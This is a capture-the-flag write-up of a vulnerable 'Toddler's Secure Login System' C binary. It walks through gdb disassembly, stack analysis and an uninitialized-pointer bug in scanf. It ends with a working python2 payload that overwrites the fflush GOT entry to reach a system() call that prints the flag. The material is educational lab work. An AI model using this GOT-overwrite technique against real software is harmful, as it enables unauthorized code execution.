Let's break some login systems :)


```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

Welp, we have two functions `welcome` and `,login`, the first one is creating a char array of length 100, scans some text and prints it, the latter function supposedly gets two numbers and compares them to `338150` and `13371337` respectively and `cat`'s out our flag if comparision succeeds.

But if we try to run it we get a segfault.
```bash
$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : hey
Welcome hey!
enter passcode1 : 123
enter passcode2 : 123
Segmentation fault (core dumped)
```

If we look more closely on the `scanf`'s inside the `login` function we can see that instead of giving `scanf` the pointer of the integer we want to fill out, we actually give it the value itself, meaning that the program tries to access a memory address that is represented by the junk value in `passcode1` and `passcode2` since it's uninitialized.

What if we try to enter a 100 characters word as an input to the name?

```bash
$ ./passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Welcome 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!
enter passcode1 : 338150
Segmentation fault (core dumped)
```

Welp, now we don't even get to input our second passcode.... let's debug the program with the same input, Let's put a breakpoint on the first `scanf`:
```bash
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) b *0x08048586
Breakpoint 1 at 0x8048586
(gdb) r
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.0 beta.
enter you name : 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Welcome 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!

Breakpoint 1, 0x08048586 in login ()
(gdb) ni
enter passcode1 : 123

Program received signal SIGSEGV, Segmentation fault.
0xf7c5df50 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
We don't even go past the first scanf, I wonder if our 100 characters input changed something.
Let's try to inspect passcode1 and passcode2 before the first `scanf` call, an easy guess for passcode1 would be `0x0804857c <+24>:	mov    -0x10(%ebp),%edx`, looks like a typical variable preparation for `scanf`:
```bash
(gdb) x/20 $ebp-0x10
0xff884d98:	0x31	0x31	0x31	0x31	0x00	0x73	0x2b	0xc1
0xff884da0:	0x84	0x4e	0x88	0xff	0x80	0x6b	0xff	0xf7
0xff884da8:	0xc8	0x4d	0x88	0xff
```

Welp, we can see that `passcode1` is equal to 4 bytes of `0x31`, which is actually `'1'` in hexadecimal representation, looks like the data from the previous frame stack was kept, If we think about it, the frame stack of welcome looked like this:
```

+--------HIGHER ADDR--------+  

+---------------------------+  
|       ret address         |  
+---------------------------+  
+---------------------------+  
|           bp              |  
+---------------------------+  
+---------------------------+  
|       name[99]             |  
+---------------------------+  
+---------------------------+  
|       name[98]             |  
+---------------------------+  
        ...  
        ...  
        ...  
+---------------------------+  
|       name[0]            |  
+---------------------------+  
  
+--------LOWER ADDR---------+  
```

Meaning that the last 4 bytes of `name` will actually be seen as the value of `passcode1` (int, 4 bytes, e.g `%ebp-0x10`).

So now we figured out we can control the value of `passcode1` before the `scanf`, If we think logically, the `scanf` function will put the input value in a memory we decide on based on the last 4 bytes in `char name[100]`.

This is also what causes the segfault (probably), when i entered 100 ones, since the memory address `0x31313131` is not accessable by the program.

Let's see if we can abuse `fflush` given our new discovery, this function is an imported function, meaning that on launch it runs a couple of instructions to load the actual instruction set of `fflush`, if we try to disassemble pre-run we will see this:
```bash
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:	jmp    *0x804a004
   0x08048436 <+6>:	push   $0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.
```

Voila! we have a jump function, we can override the value in that address block to our likings, maybe we can just write the instruction address of our `system("/bin/cat flag")` call?

So let's get it clear, we want to make the last 4 bytes of `char name[100]` equal to `0x804a004` and then write to it `0x080485ea`, so we will jump to the `system` call right away. (we also should write the second address as an integer since that's just how it is represented in memory, e.g what `0x804a004` points to).

So our final solution should be like this:
```bash
passcode@pwnable:~$ python2 -c "print '1'*96 + '\x04\xa0\x04\x08' + str(int('0x080485ea', 16))" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!
sh: 1: Syntax error: word unexpected (expecting ")")
enter passcode1 : Now I can safely trust you that you have credential :)
```

Hmmm, it even printed the last `printf` in `main` but we didn't get our flag, we also got an `sh` error, this is because we did a small mistake, and we told the program to jump straight to the `system` call and not to the line beforehand that loads the argument for the call, which is actually our command `/bin/cat flag`, so if we change the jump address to `0x080485e3` it should fix the problem:
```bash
passcode@pwnable:~$ python2 -c "print '1'*96 + '\x04\xa0\x04\x08' + str(int('0x080485e3', 16))" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!
Sorry mom.. ***********************
enter passcode1 : Now I can safely trust you that you have credential :)
```


